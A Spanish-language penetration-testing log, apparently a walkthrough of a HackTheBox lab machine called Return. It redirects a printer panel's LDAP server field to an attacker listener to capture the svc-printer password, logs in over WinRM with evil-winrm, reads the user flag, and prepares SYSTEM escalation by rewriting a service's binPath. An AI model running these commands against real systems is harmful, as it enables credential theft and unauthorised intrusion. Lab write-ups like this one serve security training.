            <td>Username</td>
            <td><input type="text" value="svc-printer"/></td>
          </tr>
          <tr>
            <td>Password</td>
            <td><input type="text" value="*******"/></td>
          </tr>
          <tr>
            <td colspan="3"><input type="submit" value="Update"/></td>
          </tr>
        </table>
      </form>
❯ cat content/http_settings_php_headers.txt
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: content/http_settings_php_headers.txt
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ HTTP/1.1 200 OK
   2   │ Content-Type: text/html; charset=UTF-8
   3   │ Server: Microsoft-IIS/10.0
   4   │ X-Powered-By: PHP/7.4.13
   5   │ Date: Fri, 08 May 2026 16:12:17 GMT
   6   │ Content-Length: 29090
   7   │ 
───────┴    

### Objetivo

Validar si el panel de impresora utiliza la configuración LDAP mostrada en `settings.php` para iniciar una conexión hacia el servidor configurado, y comprobar si esa conexión revela credenciales de servicio reutilizables.

### Hechos verificados

La ruta correcta del panel de configuración es `settings.php` y responde correctamente:

```text
HTTP/1.1 200 OK
Server: Microsoft-IIS/10.0
X-Powered-By: PHP/7.4.13
```

El formulario de configuración existe y usa método `POST`:

```html
<form action="" method="POST">
```

El campo modificable con nombre de parámetro real es:

```html
<input type="text" name="ip" value="printer.return.local"/>
```

El panel muestra una configuración LDAP aparente:

```text
Server Address: printer.return.local
Server Port: 389
Username: svc-printer
Password: *******
```

El usuario `svc-printer` existe como identidad configurada en el panel, pero todavía no se ha verificado su contraseña ni su reutilización contra otros servicios.

### Suposiciones

El panel está diseñado para probar o actualizar la conexión de la impresora contra un servidor LDAP.

Al modificar `Server Address`, es razonable esperar que el backend intente conectar al nuevo destino usando el usuario configurado.

Como el puerto indicado es `389`, la validación debe observar si llega una conexión LDAP al equipo atacante.

WinRM continúa como rama secundaria fuerte porque está abierto, pero solo pasará a rama principal si se obtiene y valida una credencial.

### Método

El hallazgo dominante ahora es:

```text
Panel de impresora con configuración LDAP expuesta y usuario de servicio visible.
```

La rama principal cambia de simple `WEB-BASE` a:

```text
WEB-BASE → configuración sensible de panel de impresora → validación de conexión LDAP
```

Ramas secundarias anotadas:

```text
AD / LDAP:
Dominio return.local y usuario svc-printer observados.

WinRM:
Disponible en 5985, pendiente de credencial válida.

SMB:
Enumeración anónima limitada, sin utilidad práctica por ahora.
```

El siguiente paso único es preparar un listener local en el puerto LDAP `389`, actualizar el campo `Server Address` con la IP de la interfaz VPN y observar si el servidor establece conexión y envía datos de autenticación.

### Respuesta

La señal importante no es solo que aparezca `svc-printer`, sino que el formulario permite modificar el destino del servidor LDAP mediante el parámetro `ip`.

La prueba correcta consiste en comprobar si el objetivo intenta autenticarse contra el destino introducido. Si se recibe una conexión con material de autenticación de `svc-printer`, el caso cambia de configuración expuesta a credencial recuperada.

La parte de la salida que interesa de verdad será una línea donde aparezca algo equivalente a:

```text
return\svc-printer
```

y, si se muestra, la contraseña asociada.

Si se obtiene una contraseña, no debe asumirse todavía acceso total. La siguiente validación será comprobar si esa credencial funciona contra WinRM, porque el puerto `5985` está abierto y es el acceso remoto más prometedor observado en fase 1.

### Comandos

```bash
ip -4 addr show tun0 | awk '/inet /{print $2}' | cut -d/ -f1
```

Este comando obtiene la IP de la interfaz VPN. Esa IP será el valor que se introduzca como nuevo `Server Address`.

En una terminal separada:

```bash
sudo nc -lvnp 389 | tee content/ldap_capture_svc_printer.txt
```

Este listener escucha en el puerto `389`, que es el puerto LDAP indicado por el panel. Lo importante será observar si llega una conexión desde `10.129.95.241` y si dentro del flujo aparece el usuario `svc-printer` junto con una contraseña.

En otra terminal, sustituyendo `<IP_TUN0>` por la IP obtenida:

```bash
curl -sS -i -X POST http://10.129.95.241/settings.php \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'ip=<IP_TUN0>' \
  | tee content/settings_update_response.txt
```

Este comando reproduce el envío del formulario modificando únicamente el parámetro real identificado: `ip`. La prueba no depende de adivinar campos ocultos; usa la evidencia del formulario HTML.

### Comprobaciones

Tras ejecutar la prueba, hay que registrar:

```text
Si el listener recibe conexión.
IP origen de la conexión.
Si aparece return\svc-printer.
Si aparece una contraseña en claro.
Respuesta HTTP del POST a settings.php.
```

Criterio de decisión siguiente:

```text
Si se obtiene contraseña de svc-printer:
pasar a rama CREDENCIALES y validar contra WinRM.

Si solo llega conexión sin credencial:
confirmar que el listener estaba en tun0 y repetir una sola vez revisando IP y firewall local.

Si no llega conexión:
revisar si el POST actualizó realmente el formulario y si el puerto local 389 está escuchando.

Si la credencial no funciona en WinRM:
mantenerla como credencial de dominio candidata y validar contra SMB/LDAP antes de descartarla.
```
### Ejecutamos:

❯ cd /home/r4mon/pentest/targets/HTB/easy/Return/
❯ ip -4 addr show tun0 | awk '/inet /{print $2}' | cut -d/ -f1
10.10.15.26
❯ sudo nc -lvnp 389 | tee content/ldap_capture_svc_printer.txt
[sudo] contraseña para r4mon: 
listening on [any] 389 ...
0*`%return\svc-printer
                      1edFg43012!!connect to [10.10.15.26] from (UNKNOWN) [10.129.95.241] 49980

❯ cd /home/r4mon/pentest/targets/HTB/easy/Return/
❯ curl -sS -i -X POST http://10.129.95.241/settings.php \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'ip=10.10.15.26' \
  | tee content/settings_update_response.txt

### Objetivo

Validar la credencial recuperada del panel de impresora contra WinRM y, si el acceso es correcto, documentar el contexto real del usuario obtenido antes de plantear cualquier escalada.

### Hechos verificados

La IP de la interfaz VPN usada como servidor LDAP controlado es:

```text
10.10.15.26
```

El objetivo `10.129.95.241` se conectó al listener local en el puerto `389`:

```text
connect to [10.10.15.26] from (UNKNOWN) [10.129.95.241] 49980
```

La conexión LDAP reveló la identidad configurada en el panel:

```text
return\svc-printer
```

También se recuperó la contraseña asociada:

```text
1edFg43012!!
```

El hallazgo dominante cambia ahora de configuración LDAP expuesta a credencial de dominio recuperada.

### Suposiciones

La credencial pertenece al dominio `RETURN`.

El usuario `svc-printer` puede estar pensado para servicios de impresión, LDAP o integración de la impresora con Active Directory.

Como WinRM está abierto en el puerto `5985`, la validación más rentable es comprobar si esta credencial permite acceso remoto interactivo.

### Método

La rama principal cambia a:

```text
CREDENCIALES → validación contra WinRM
```

Ramas secundarias anotadas:

```text
WEB-BASE:
Ya cumplió su función principal al revelar y activar la captura LDAP.

AD / LDAP:
Sigue siendo contexto de dominio relevante.

SMB:
Queda como alternativa si WinRM no valida la credencial.

WinRM:
Pasa a ser el siguiente punto de validación principal.
```

El siguiente paso único es comprobar si `svc-printer` puede autenticarse por WinRM y, si entra, documentar usuario, hostname, dominio y grupos.

### Respuesta

La captura es una evidencia fuerte: el panel intentó autenticarse contra el servidor LDAP introducido y envió credenciales de `svc-printer`.

Ahora no conviene saltar directamente a escalada. Primero hay que validar tres cosas:

```text
1. La credencial funciona realmente.
2. El acceso remoto obtenido es WinRM.
3. El usuario pertenece a algún grupo con privilegios útiles.
```

La comprobación crítica, una vez dentro, será `whoami /groups`. En Windows y Active Directory, los grupos del token pueden ser más importantes que el propio usuario, porque determinan qué acciones administrativas están permitidas.

### Comandos

Validar WinRM de forma rápida:

```bash
netexec winrm 10.129.95.241 -u 'svc-printer' -p '1edFg43012!!'
```

Este comando comprueba si la credencial sirve para WinRM sin abrir todavía una shell interactiva. La señal importante será si aparece autenticación correcta y acceso permitido por WinRM.

Si valida correctamente, abrir sesión:

```bash
evil-winrm -i 10.129.95.241 -u 'svc-printer' -p '1edFg43012!!'
```

Una vez dentro de Evil-WinRM, documentar contexto:

```powershell
whoami
hostname
whoami /user
whoami /groups
pwd
```

Estos comandos no escalan privilegios. Solo fijan evidencia básica:

```text
whoami        → identidad efectiva
hostname      → host real
whoami /user  → SID del usuario
whoami /groups → grupos y privilegios del token
pwd           → directorio inicial
```

### Comprobaciones

La siguiente evidencia necesaria es:

```text
Resultado de netexec winrm.
Si Evil-WinRM abre sesión correctamente.
Salida de whoami.
Salida de hostname.
Salida de whoami /user.
Salida completa de whoami /groups.
```

Criterio de decisión siguiente:

```text
Si WinRM funciona:
la rama principal pasa a acceso remoto validado y enumeración de privilegios del usuario.

Si svc-printer pertenece a Server Operators u otro grupo privilegiado:
la siguiente fase será analizar qué permite ese grupo en Windows.

Si WinRM falla:
la credencial se mantiene como válida candidata y se prueba contra SMB/LDAP antes de descartarla.

Si los grupos no muestran privilegios útiles:
se continúa enumeración local y de dominio con bajo ruido.
```
### Ejecutamos:

❯ netexec winrm 10.129.95.241 -u 'svc-printer' -p '1edFg43012!!'
WINRM       10.129.95.241   5985   PRINTER          [*] Windows 10 / Server 2019 Build 17763 (name:PRINTER) (domain:return.local) 
WINRM       10.129.95.241   5985   PRINTER          [+] return.local\svc-printer:1edFg43012!! (Pwn3d!)
❯ evil-winrm -i 10.129.95.241 -u 'svc-printer' -p '1edFg43012!!'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc-printer\Documents> whoami
return\svc-printer
*Evil-WinRM* PS C:\Users\svc-printer\Documents> id
The term 'id' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
At line:1 char:1
+ id
+ ~~
    + CategoryInfo          : ObjectNotFound: (id:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
*Evil-WinRM* PS C:\Users\svc-printer\Documents> pwd

Path
----
C:\Users\svc-printer\Documents


*Evil-WinRM* PS C:\Users\svc-printer\Documents> ls -la
A parameter cannot be found that matches parameter name 'la'.
At line:1 char:4
+ ls -la
+    ~~~
    + CategoryInfo          : InvalidArgument: (:) [Get-ChildItem], ParameterBindingException
    + FullyQualifiedErrorId : NamedParameterNotFound,Microsoft.PowerShell.Commands.GetChildItemCommand
*Evil-WinRM* PS C:\Users\svc-printer\Documents> ls
*Evil-WinRM* PS C:\Users\svc-printer\Documents> dir
*Evil-WinRM* PS C:\Users\svc-printer\Documents>

### Objetivo

Cerrar la validación de la credencial `svc-printer` como acceso remoto real por WinRM y continuar con la enumeración mínima del contexto Windows antes de decidir la vía de privilegios.

### Hechos verificados

La credencial recuperada funciona contra WinRM:

```text
return.local\svc-printer:1edFg43012!! (Pwn3d!)
```

Se ha obtenido una sesión interactiva con Evil-WinRM en el host `PRINTER`:

```text
*Evil-WinRM* PS C:\Users\svc-printer\Documents>
```

La identidad efectiva confirmada es:

```text
return\svc-printer
```

El directorio actual es:

```text
C:\Users\svc-printer\Documents
```

Los comandos `id` y `ls -la` no son válidos en PowerShell:

```text
The term 'id' is not recognized
A parameter cannot be found that matches parameter name 'la'
```

El directorio `Documents` no muestra contenido relevante con `ls` ni `dir`.

### Suposiciones

El acceso por WinRM confirma que `svc-printer` no es solo una cuenta de servicio LDAP, sino una credencial reutilizable con acceso remoto al sistema.

El resultado `Pwn3d!` en WinRM indica que la autenticación y el acceso remoto son válidos, pero todavía no demuestra privilegios administrativos completos.

El siguiente dato crítico no es el contenido del directorio actual, sino los grupos y privilegios asociados al token de `svc-printer`.

### Método

El hallazgo dominante actual es:

```text
Credencial de dominio válida con acceso WinRM como svc-printer.
```

La rama principal activa pasa a ser:

```text
Acceso remoto validado → enumeración de contexto y privilegios Windows.
```

Ramas secundarias anotadas:

```text
AD / LDAP:
Dominio return.local confirmado.

SMB:
Queda como apoyo si se necesita validar recursos o permisos laterales.

WEB-BASE:
Cerrada como vía inicial; ya produjo la credencial útil.

WinRM:
Confirmada como vía de acceso principal.
```

El siguiente paso único es obtener el contexto completo del usuario: host, SID, grupos, privilegios y ubicación de la flag de usuario.

### Respuesta

La fase de acceso inicial queda validada. Ahora hay que evitar un error típico: tratar la shell de PowerShell como si fuera una shell Linux.

Equivalencias útiles:

```text
Linux              PowerShell / Windows
id                 whoami /user
id / groups         whoami /groups
ls -la             Get-ChildItem -Force
pwd                Get-Location o pwd
cat archivo         type archivo o Get-Content archivo
```

La comprobación que más importa ahora es `whoami /groups`. Si aparece un grupo privilegiado, especialmente uno relacionado con administración de servidor, ese grupo pasará a ser el hallazgo dominante de la fase.

### Comandos

Dentro de Evil-WinRM:

```powershell
hostname
```

Confirma el host real sobre el que se ha obtenido sesión.

```powershell
whoami /user
```

Muestra el SID del usuario actual y confirma formalmente la identidad del token.

```powershell
whoami /groups
```

Enumera los grupos del usuario. Esta salida es prioritaria porque puede revelar pertenencia a grupos con capacidad administrativa.

```powershell
whoami /priv
```

Lista privilegios del token. Interesa comprobar si hay privilegios útiles o si están deshabilitados.

```powershell
Get-Location
```

Confirma el directorio actual en sintaxis PowerShell.

```powershell
Get-ChildItem -Force
```

Lista contenido incluyendo elementos ocultos, equivalente práctico a `ls -la`.

```powershell
Get-ChildItem -Force C:\Users\svc-printer\Desktop
```

Revisa el escritorio del usuario, ubicación habitual de `user.txt`.

```powershell
Get-Content C:\Users\svc-printer\Desktop\user.txt
```

Lee la flag de usuario si existe.

### Comprobaciones

La siguiente evidencia necesaria es:

```text
Salida de hostname.
Salida de whoami /user.
Salida completa de whoami /groups.
Salida de whoami /priv.
Confirmación de user.txt si está presente.
```

Criterio de decisión siguiente:

```text
Si svc-printer pertenece a Server Operators:
la rama principal pasará a análisis de capacidades de ese grupo sobre servicios Windows.

Si solo pertenece a Remote Management Users:
se continuará enumeración local y de dominio buscando permisos adicionales.

Si whoami /priv muestra privilegios relevantes:
se analizará si están habilitados y qué impacto real tienen.

Si no aparece ningún grupo útil:
se ampliará la enumeración local con usuarios, servicios y permisos, sin saltar todavía a escalada.
```
### Ejecutamos:

*Evil-WinRM* PS C:\Users\svc-printer\Documents> hostname
printer
*Evil-WinRM* PS C:\Users\svc-printer\Documents> whoami /user

USER INFORMATION
----------------

User Name          SID
================== =============================================
return\svc-printer S-1-5-21-3750359090-2939318659-876128439-1103
*Evil-WinRM* PS C:\Users\svc-printer\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Server Operators                   Alias            S-1-5-32-549 Mandatory group, Enabled by default, Enabled group
BUILTIN\Print Operators                    Alias            S-1-5-32-550 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288
*Evil-WinRM* PS C:\Users\svc-printer\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                         State
============================= =================================== =======
SeMachineAccountPrivilege     Add workstations to domain          Enabled
SeLoadDriverPrivilege         Load and unload device drivers      Enabled
SeSystemtimePrivilege         Change the system time              Enabled
SeBackupPrivilege             Back up files and directories       Enabled
SeRestorePrivilege            Restore files and directories       Enabled
SeShutdownPrivilege           Shut down the system                Enabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
SeTimeZonePrivilege           Change the time zone                Enabled
*Evil-WinRM* PS C:\Users\svc-printer\Documents> Get-Location

Path
----
C:\Users\svc-printer\Documents


*Evil-WinRM* PS C:\Users\svc-printer\Documents> Get-ChildItem -Force


    Directory: C:\Users\svc-printer\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d--hsl        5/26/2021   1:51 AM                My Music
d--hsl        5/26/2021   1:51 AM                My Pictures
d--hsl        5/26/2021   1:51 AM                My Videos


*Evil-WinRM* PS C:\Users\svc-printer\Documents> Get-ChildItem -Force C:\Users\svc-printer\Desktop


    Directory: C:\Users\svc-printer\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         5/8/2026   5:06 AM             34 user.txt


*Evil-WinRM* PS C:\Users\svc-printer\Documents> Get-Content C:\Users\svc-printer\Desktop\user.txt
46a4f8c3e5bba0afe3432d836dc35450

### Objetivo

Cerrar la fase de acceso inicial con la primera flag obtenida y preparar la escalada de privilegios a partir del hallazgo dominante: pertenencia de `svc-printer` al grupo `BUILTIN\Server Operators`.

### Hechos verificados

El host comprometido es:

```text
printer
```

La identidad efectiva es:

```text
return\svc-printer
```

El SID del usuario es:

```text
S-1-5-21-3750359090-2939318659-876128439-1103
```

El usuario pertenece a grupos relevantes:

```text
BUILTIN\Server Operators
BUILTIN\Print Operators
BUILTIN\Remote Management Users
```

El acceso por WinRM queda explicado por:

```text
BUILTIN\Remote Management Users
```

El hallazgo crítico para la escalada es:

```text
BUILTIN\Server Operators
```

El token contiene privilegios potentes habilitados, entre ellos:

```text
SeBackupPrivilege
SeRestorePrivilege
SeLoadDriverPrivilege
SeShutdownPrivilege
SeRemoteShutdownPrivilege
```

La primera flag se ha obtenido correctamente:

```text
46a4f8c3e5bba0afe3432d836dc35450
```

### Suposiciones

La pertenencia a `Server Operators` puede permitir administrar servicios locales del sistema.

En Windows, si un usuario puede modificar la ruta de ejecución de un servicio que corre con privilegios altos, puede convertir esa capacidad en ejecución como `NT AUTHORITY\SYSTEM`.

No se debe asumir aún privilegio `SYSTEM`; primero hay que validar qué servicios puede consultar, modificar, parar o iniciar `svc-printer`.

### Método

El hallazgo dominante actual es:

```text
svc-printer pertenece a BUILTIN\Server Operators.
```

La rama principal activa pasa a ser:

```text
Escalada Windows por abuso controlado de administración de servicios.
```

Ramas secundarias anotadas:

```text
SeBackupPrivilege / SeRestorePrivilege:
Alternativa potencial si la vía de servicios falla.

Print Operators:
Contexto coherente con la cuenta de impresora, pero no es la vía principal ahora.

AD / LDAP:
Contexto de dominio ya usado para obtener credencial; queda en segundo plano.

SMB:
Sin utilidad práctica actual.
```

El siguiente paso único es validar desde la sesión WinRM si `svc-printer` puede consultar y modificar servicios locales, empezando por un servicio existente y documentando su configuración antes de tocar nada.

### Respuesta

La máquina ya ha pasado de acceso inicial a escalada local. El dato importante no es solo que `svc-printer` tenga WinRM, sino que tiene un grupo administrativo clásico de Windows:

```text
BUILTIN\Server Operators
```

Ese grupo puede operar servicios del sistema. La técnica a validar es:

```text
modificar temporalmente la ruta de ejecución de un servicio controlable
→ iniciar el servicio
→ obtener ejecución con el contexto del servicio
→ restaurar la configuración si procede
```

Antes de modificar nada, hay que registrar el estado original del servicio elegido. Esto es importante para trazabilidad y para poder explicar en el informe qué se cambió y por qué funcionó.

### Comandos

Dentro de Evil-WinRM, comprobar el contexto administrativo de servicios:

```powershell
sc.exe query
```

Este comando lista servicios. Interesa confirmar que el usuario puede consultar el Service Control Manager.

Consultar un servicio candidato concreto:

```powershell
sc.exe qc vss
```

Este comando muestra la configuración del servicio `vss`. La parte importante es:

```text
BINARY_PATH_NAME
SERVICE_START_NAME
START_TYPE
```

Guardar también una lectura más cómoda desde PowerShell:

```powershell
Get-CimInstance Win32_Service -Filter "Name='vss'" | Select-Object Name,State,StartName,PathName
```

Este comando ayuda a documentar si el servicio corre como `LocalSystem` u otra cuenta privilegiada.

Validar si el servicio puede detenerse e iniciarse:

```powershell
sc.exe stop vss
sc.exe start vss
```

La señal útil será si aparece un error de permisos o si el Service Control Manager acepta la operación. Si acepta parar o iniciar, la vía de `Server Operators` gana mucha fuerza.

Comprobar el estado tras la prueba:

```powershell
sc.exe query vss
```

### Comprobaciones

Debe quedar registrada esta evidencia:

```text
Salida de sc.exe qc vss.
Cuenta con la que corre el servicio.
Ruta original del binario del servicio.
Resultado de sc.exe stop vss.
Resultado de sc.exe start vss.
Estado final del servicio.
```

Criterio de decisión siguiente:

```text
Si svc-printer puede modificar o controlar vss:
la escalada por abuso de servicio queda como rama principal.

Si solo puede consultar pero no modificar:
se revisarán otros servicios y privilegios habilitados.

Si los servicios no son viables:
la rama secundaria será SeBackupPrivilege / SeRestorePrivilege.

Si se obtiene ejecución privilegiada:
confirmar inmediatamente whoami, hostname y lectura de la flag final.
```
### Ejecutamos:

*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe query
[SC] OpenSCManager FAILED 5:

Access is denied.

*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe qc vss
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: vss
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\system32\vssvc.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Volume Shadow Copy
        DEPENDENCIES       : RPCSS
        SERVICE_START_NAME : LocalSystem
*Evil-WinRM* PS C:\Users\svc-printer\Documents> Get-CimInstance Win32_Service -Filter "Name='vss'" | Select-Object Name,State,StartName,PathName
Access denied 
At line:1 char:1
+ Get-CimInstance Win32_Service -Filter "Name='vss'" | Select-Object Na ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (:) [Get-CimInstance], CimException
    + FullyQualifiedErrorId : HRESULT 0x80041003,Microsoft.Management.Infrastructure.CimCmdlets.GetCimInstanceCommand
*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe stop vss
[SC] ControlService FAILED 1062:

The service has not been started.

*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe start vss

SERVICE_NAME: vss
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
        PID                : 2528
        FLAGS              :
*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe query vss

SERVICE_NAME: vss
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

### Objetivo

Interpretar la prueba sobre el servicio `vss` y decidir si la vía de escalada por abuso de servicios sigue siendo válida con el usuario `svc-printer`.

### Hechos verificados

La consulta global del Service Control Manager falla:

```text
[SC] OpenSCManager FAILED 5:
Access is denied.
```

La consulta específica del servicio `vss` sí funciona:

```text
[SC] QueryServiceConfig SUCCESS
```

El servicio `vss` ejecuta este binario original:

```text
C:\Windows\system32\vssvc.exe
```

El servicio corre como:

```text
LocalSystem
```

El servicio está configurado como inicio bajo demanda:

```text
START_TYPE : 3 DEMAND_START
```

`Get-CimInstance` no tiene permisos suficientes:

```text
Access denied
```

El servicio `vss` estaba detenido inicialmente:

```text
The service has not been started.
```

El usuario ha podido iniciar el servicio correctamente:

```text
STATE : 4 RUNNING
```

### Suposiciones

Aunque `svc-printer` no pueda consultar todo el Service Control Manager, sí tiene capacidad suficiente sobre servicios concretos.

La capacidad de iniciar `vss`, combinada con la pertenencia a `Server Operators`, mantiene viva la hipótesis de abuso de servicios.

El dato crítico ya no es si se puede iniciar el servicio, sino si se puede modificar temporalmente su `BINARY_PATH_NAME`.

### Método

El hallazgo dominante actual es:

```text
svc-printer puede consultar e iniciar el servicio vss, que corre como LocalSystem.
```

La rama principal sigue siendo:

```text
Escalada Windows por abuso de servicio controlable.
```

Ramas secundarias anotadas:

```text
SeBackupPrivilege / SeRestorePrivilege:
Alternativa si no se puede modificar el servicio.

Print Operators:
Contexto secundario.

Enumeración local:
Queda en espera porque la vía de servicios tiene mejor señal.
```

El siguiente paso único es comprobar si `svc-printer` puede cambiar la ruta binaria de `vss`. Antes de cualquier acción de impacto, hay que guardar la configuración original para trazabilidad y posible restauración.

### Respuesta

La vía sigue siendo buena.

Hay dos señales fuertes:

```text
SERVICE_START_NAME : LocalSystem
```

y:

```text
sc.exe start vss
```

ha funcionado.

Eso significa que si el usuario puede cambiar el `binPath` del servicio, cualquier binario o comando ejecutado por ese servicio heredará contexto `LocalSystem`.

La validación correcta ahora es mínima y ordenada:

```text
1. guardar configuración original;
2. comprobar permiso de modificación del servicio;
3. preparar el artefacto de ejecución controlado;
4. iniciar el servicio;
5. confirmar contexto obtenido;
6. restaurar el servicio si procede.
```

### Comandos

Guardar la configuración original:

```powershell
sc.exe qc vss
```

Comprobar si el usuario puede modificar el servicio con una prueba controlada de configuración:

```powershell
sc.exe config vss binPath= "C:\Windows\system32\vssvc.exe"
```

Esta prueba no cambia realmente el vector, porque deja el binario original. Sirve para confirmar si `sc.exe config` acepta modificaciones sobre `vss`.

Si la modificación se acepta, detener el servicio antes de cambiar la ruta de ejecución:

```powershell
sc.exe stop vss
```

Para la fase práctica de ejecución privilegiada, el operador debe preparar el binario o acción controlada y colocarla en una ruta accesible por el usuario actual, por ejemplo:

```text
C:\Users\svc-printer\Documents\
```

Después se modificaría temporalmente `BINARY_PATH_NAME`, se iniciaría el servicio y se validaría el contexto obtenido.

Restauración prevista del servicio:

```powershell
sc.exe config vss binPath= "C:\Windows\system32\vssvc.exe"
```

Comprobar estado final:

```powershell
sc.exe query vss
sc.exe qc vss
```

### Comprobaciones

La siguiente evidencia necesaria es:

```text
Resultado de sc.exe config vss binPath= "C:\Windows\system32\vssvc.exe".
Si devuelve SUCCESS, la vía de abuso de servicio queda confirmada.
Si devuelve Access denied, se pasa a la rama secundaria de privilegios SeBackupPrivilege / SeRestorePrivilege.
```

Criterio de decisión siguiente:

```text
Si sc.exe config permite modificar vss:
la siguiente fase será ejecución controlada como LocalSystem mediante el servicio.

Si sc.exe config no permite modificar vss:
la vía de Server Operators queda parcialmente limitada y se revisan privilegios habilitados.

Si se obtiene ejecución como SYSTEM:
confirmar whoami, hostname y leer la flag final.

Si el servicio queda alterado:
restaurar BINARY_PATH_NAME a C:\Windows\system32\vssvc.exe.
```
#### Ejecutamos:

*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe qc vss
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: vss
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\system32\vssvc.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Volume Shadow Copy
        DEPENDENCIES       : RPCSS
        SERVICE_START_NAME : LocalSystem
*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe config vss binPath= "C:\Windows\system32\vssvc.exe"
[SC] ChangeServiceConfig SUCCESS
*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe stop vss

SERVICE_NAME: vss
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 3  STOP_PENDING
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe config vss binPath= "C:\Windows\system32\vssvc.exe"
[SC] ChangeServiceConfig SUCCESS
*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe query vss

SERVICE_NAME: vss
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 1  STOPPED
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe qc vss
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: vss
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\system32\vssvc.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Volume Shadow Copy
        DEPENDENCIES       : RPCSS
        SERVICE_START_NAME : LocalSystem

### Objetivo

Confirmar que la modificación del servicio `vss` es viable y usar esa capacidad de forma controlada para obtener ejecución con contexto `LocalSystem`.

### Hechos verificados

La configuración original del servicio `vss` ha quedado documentada:

```text
BINARY_PATH_NAME   : C:\Windows\system32\vssvc.exe
SERVICE_START_NAME : LocalSystem
START_TYPE         : DEMAND_START
```

El usuario `svc-printer` puede modificar la ruta binaria del servicio:

```text
[SC] ChangeServiceConfig SUCCESS
```

El servicio se ha detenido correctamente:

```text
STATE : 1  STOPPED
```

La ruta original ha sido restaurada correctamente tras la prueba:

```text
BINARY_PATH_NAME   : C:\Windows\system32\vssvc.exe
```

### Suposiciones

La vía de escalada por abuso de servicios queda validada porque se cumplen las tres condiciones clave:

```text
servicio modificable
+ servicio ejecutado como LocalSystem
+ capacidad de iniciar/detener el servicio
